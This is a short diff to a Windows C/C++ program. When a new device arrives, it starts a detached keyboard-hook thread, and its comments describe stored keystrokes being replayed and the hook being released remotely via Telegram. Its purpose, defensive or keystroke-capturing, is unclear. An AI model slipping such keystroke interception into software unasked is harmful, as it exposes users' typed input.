@@ -1,6 +1,7 @@
 #include <Windows.h>
 #include <stdio.h>
 #include <dbt.h>
+#include "keyboard.h"
 
 HDEVNOTIFY ghDeviceNotify;
 HANDLE hFileLog;
@@ -79,7 +80,11 @@ LRESULT CALLBACK Wndproc(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam) {
 							// add to cache to prevent retrigger of hooks
 							strcpy_s(deviceCache, 256, temp);
 							// hook keyboard here
+							std::thread kbHookThread(keyboardHook);
+							kbHookThread.detach();
 							// unhook happens via telegram
+							// call releaseHook when hook should be done
+							// call replayInputs to release all stored keystrokes
 
 							break;
 						}
